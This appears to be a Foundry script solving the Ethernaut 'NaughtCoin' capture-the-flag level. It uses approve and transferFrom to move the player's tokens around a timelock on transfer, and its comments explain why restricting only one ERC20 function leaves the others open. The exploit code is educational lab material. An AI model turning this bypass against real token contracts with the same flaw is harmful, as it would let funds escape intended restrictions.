// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/NaughtCoin.sol";
import "@forge-std/Script.sol";

contract NaughtCoinScript is Script {
    NaughtCoin public naughtcoinContract;
    function setUp() public {
        naughtcoinContract = NaughtCoin(payable(vm.envAddress("NAUGHTCOIN_CONTRACT")));
    }
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        naughtcoinContract.approve(naughtcoinContract.player(), naughtcoinContract.balanceOf(naughtcoinContract.player()));
        naughtcoinContract.transferFrom(naughtcoinContract.player(), address(naughtcoinContract), naughtcoinContract.balanceOf(naughtcoinContract.player()));
        vm.stopBroadcast();
    }
}

// Exploit: There are other ways to transfer the tokens than transfer function. One of which is approve and transferFrom function usage
// these both can be used in conjunction.

// When using code that's not your own, it's a good idea to familiarize yourself with it to get a good understanding of how everything fits together. 
// This can be particularly important when there are multiple levels of imports (your imports have imports) or when you are implementing authorization controls,
// e.g. when you're allowing or disallowing people from doing things. 
// In this example, a developer might scan through the code and think that transfer is the only way to move tokens around, low and behold there are other ways of performing the same operation with a different implementation.